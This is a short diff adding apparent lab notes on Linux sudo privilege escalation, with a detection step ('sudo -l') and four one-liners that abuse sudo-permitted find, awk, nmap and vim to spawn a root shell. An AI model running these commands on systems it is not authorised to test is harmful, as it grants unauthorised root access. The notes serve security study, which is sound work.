@@ -1,0 +1,19 @@
+Detection
+
+Linux VM
+
+In command prompt type: sudo -l
+
+From the output, notice the list of programs that can run via sudo.
+
+Exploitation
+
+Linux VM
+
+a. sudo find /bin -name nano -exec /bin/sh \;
+
+b. sudo awk 'BEGIN {system("/bin/sh")}'
+
+c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+
+d. sudo vim -c '!sh' 
